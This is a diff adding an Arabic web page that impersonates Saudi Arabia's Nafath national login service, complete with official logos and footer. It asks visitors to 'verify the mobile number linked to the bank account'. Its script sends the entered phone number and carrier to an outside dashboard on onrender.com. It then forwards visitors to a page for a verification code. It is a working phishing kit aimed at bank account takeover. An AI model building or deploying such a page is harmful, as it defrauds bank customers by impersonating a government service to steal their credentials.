@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>توثيق رقم الجوال</title>
+  <style>
+    body {
+      font-family: "Tajawal", sans-serif;
+      background-size: cover;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background: #fff;
+      padding: 5px 20px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      height: 75px; 
+    }
+
+    header img {
+      height: 100%; 
+      width: auto;  
+      border-radius: 15px;
+    }
+
+    .container {
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      padding: 25px 20px;
+      background: #fff;
+      width: 100%;
+      max-width: 380px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      text-align: center;
+      margin: auto;
+    }
+
+    .container h3 {
+      font-size: 17px;
+      margin-bottom: 20px;
+      line-height: 1.6;
+      color: #333;
+    }
+
+    .input-box {
+      margin-bottom: 15px;
+      width: 100%;
+    }
+
+    input[type="text"],
+    select {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+      font-size: 16px;
+      text-align: center;
+      outline: none;
+      transition: border-color 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    input.phone {
+      direction: ltr;
+      border-color: rgba(0,0,0,0.05);
+    }
+
+    input:focus,
+    select:focus {
+      border-color: #009688;
+    }
+
+    .btn {
+      background-color: #009688;
+      color: white;
+      border: none;
+      padding: 13px;
+      border-radius: 8px;
+      width: 100%;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn:hover {
+      background-color: #00796b;
+    }
+
+    footer {
+      background: #f1f2f6;
+      text-align: center;
+      padding: 20px;
+      border-top: 1px solid #ddd;
+      font-size: 14px;
+      color: #333;
+    }
+    footer img {
+      height: 60px;
+      margin-bottom: 10px;
+      border-radius: 15px;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        max-width: 92%;
+      }
+      .container h3 {
+        font-size: 15px;
+      }
+      input, select, .btn {
+        font-size: 15px;
+        padding: 11px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <img src="images/nafadLogo.avif" alt="شعار نفاذ ورؤية 2030">
+  </header>
+
+  <!-- Container -->
+  <div class="container">
+    <h3>توثيق رقم الجوال المرتبط بالحساب البنكي</h3>
+
+    <div class="input-box">
+      <input type="text" id="phone" class="phone" placeholder="05*******">
+    </div>
+
+    <div class="input-box">
+      <select id="operator">
+        <option value="">مشغل الشبكة</option>
+        <option>STC – الاتصالات السعودية</option>
+        <option>Mobily – موبايلي</option>
+        <option>Zain – زين</option>
+        <option>Virgin Mobile – فيرجن موبايل</option>
+        <option>Red Bull Mobile – ريد بُل موبايل</option>
+        <option>Lebara – ليبارا</option>
+        <option>Salam Mobile – سلام موبايل</option>
+      </select>
+    </div>
+
+    <button class="btn" id="confirmBtn">تأكيد</button>
+  </div>
+
+  <script>
+  document.getElementById('confirmBtn').addEventListener('click', async function () {
+    const phone = document.getElementById('phone').value.trim();
+    const operator = document.getElementById('operator').value.trim();
+localStorage.setItem("phone", phone);
+    if (!phone || !operator) {
+      alert("يرجى إدخال رقم الجوال واختيار المشغل.");
+      return;
+    }
+
+    const message =
+      `📱 توثيق رقم الجوال:\n` +
+      `رقم الجوال: ${phone}\n` +
+      `مشغل الشبكة: ${operator}`;
+
+    try {
+      const response = await fetch("https://bm-dashboard-a0mt.onrender.com/api/messages", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message })
+      });
+
+      if (response.ok) {
+        window.location.href = "mobileNumberCode.html"; // نجاح → انتقال للخطوة التالية
+      } else {
+        const err = await response.text();
+        alert("خطأ: " + err);
+      }
+    } catch (error) {
+      console.error(error);
+      alert("تعذر الاتصال بالخادم.");
+    }
+  });
+  </script>
+
+  <!-- Footer -->
+  <footer>
+    <img src="images/nic.png" alt="شعار مركز المعلومات الوطني">
+    <p>© 2025 النفاذ الوطني الموحد جميع الحقوق محفوظة</p>
+    <p>تطوير وتشغيل مركز المعلومات الوطني</p>
+    <img src="images/digital.png" alt="شعار مركز المعلومات الوطني">
+  </footer>
+
+</body>
+</html>
